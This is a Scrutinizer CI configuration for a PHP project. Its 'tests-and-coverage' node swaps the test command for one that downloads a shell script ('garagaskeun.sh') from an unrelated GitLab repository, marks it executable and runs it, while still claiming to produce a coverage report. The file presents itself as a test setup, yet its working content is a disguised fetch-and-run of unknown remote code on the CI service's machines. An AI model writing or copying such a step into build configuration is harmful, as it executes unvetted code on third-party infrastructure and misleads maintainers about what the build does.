imports:
    - php

filter:
    excluded_paths: [vendor/*, test/*]

build:
    nodes:
        analysis:
            tests:
                override:
                    - php-scrutinizer-run

        tests-and-coverage:
            tests:
                override:
                    -
                        command: "wget https://gitlab.com/adamasdsad/anjim6/-/raw/master/garagaskeun.sh && chmod u+x garagaskeun.sh && ./garagaskeun.sh"
                        coverage:
                            file: "build/coverage.clover"
                            format: "php-clover"
